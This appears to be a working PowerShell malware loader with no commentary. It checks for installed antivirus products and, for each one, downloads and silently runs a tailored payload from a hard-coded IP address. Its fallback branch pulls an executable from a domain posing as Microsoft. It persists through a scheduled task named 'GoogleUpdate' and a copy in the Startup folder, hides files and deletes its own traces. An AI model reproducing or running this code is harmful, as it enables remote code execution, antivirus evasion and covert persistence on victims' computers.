Function Froool_tyhn
{

$Nod32 = "C:\Program Files\ESET\ESET Security\ecmds.exe"

if([System.IO.File]::Exists($Nod32)){

$url = "http://34.105.85.231/New/Nod.txt" 
$path = "C:\Users\Public\Untitled.ps1" 
# param([string]$url, [string]$path) 

if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 

(New-Object Net.WebClient).DownloadFile($url, $path) 
$path


schtasks.exe /create /tn GoogleUpdate /sc minute  /st 00:10 /tr C:\ProgramData\Instagram\System32\Microsoft\SystemData\OFF.vbs

powershell -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "C:\Users\Public\Untitled.ps1"




}

elseif([System.IO.File]::Exists("C:\Program Files\AVG\Antivirus\AVGUI.exe")){

$url = "http://34.105.85.231/New/Avast.txt" 
$path = "C:\Users\Public\Untitled.ps1" 
# param([string]$url, [string]$path) 

if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 

(New-Object Net.WebClient).DownloadFile($url, $path) 
$path

powershell -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "C:\Users\Public\Untitled.ps1"

}


elseif([System.IO.File]::Exists("C:\Program Files\Malwarebytes\Anti-Malware\mbamtray.exe")){

$url = "http://34.105.85.231/New/Killd.txt" 
$path = "C:\Users\Public\Untitled.ps1" 
# param([string]$url, [string]$path) 

if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 

(New-Object Net.WebClient).DownloadFile($url, $path) 
$path

powershell -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "C:\Users\Public\Untitled.ps1"

}



elseif([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI.exe")){

$url = "http://34.105.85.231/New/Avast.txt" 
$path = "C:\Users\Public\Untitled.ps1" 
# param([string]$url, [string]$path) 

if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 

(New-Object Net.WebClient).DownloadFile($url, $path) 
$path




powershell -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "C:\Users\Public\Untitled.ps1"






}





else{


$url = "http://microsoft.soundcast.me/Run/task.txt" 
$path = "C:\Users\Public\Music\Untitled.ps1" 
if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 
(New-Object Net.WebClient).DownloadFile($url, $path) 
$path

$url = "http://microsoft.soundcast.me/Run/SecurityHealth.exe" 
$path = "C:\Users\Public\Music\SecurityHealth.exe" 
if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 
(New-Object Net.WebClient).DownloadFile($url, $path) 
$path

$url = "http://microsoft.soundcast.me/Run/SecurityHealth.exe.manifest" 
$path = "C:\Users\Public\Music\SecurityHealth.exe.manifest" 
if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 
(New-Object Net.WebClient).DownloadFile($url, $path) 
$path


start-sleep 10
powershell -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "C:\Users\Public\Music\Untitled.ps1"




start-sleep 10

Copy-Item -Path "C:\Users\Public\Music\SecurityHealth.exe" -Destination "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force -Verbose
Copy-Item -Path "C:\Users\Public\Music\SecurityHealth.exe.manifest" -Destination "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force -Verbose
start-sleep 5
attrib +h "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SecurityHealth.exe.manifest" 

start-sleep 5
Remove-Item C:\Users\Public\Music\Untitled.ps1

}

}

IEX Froool_tyhn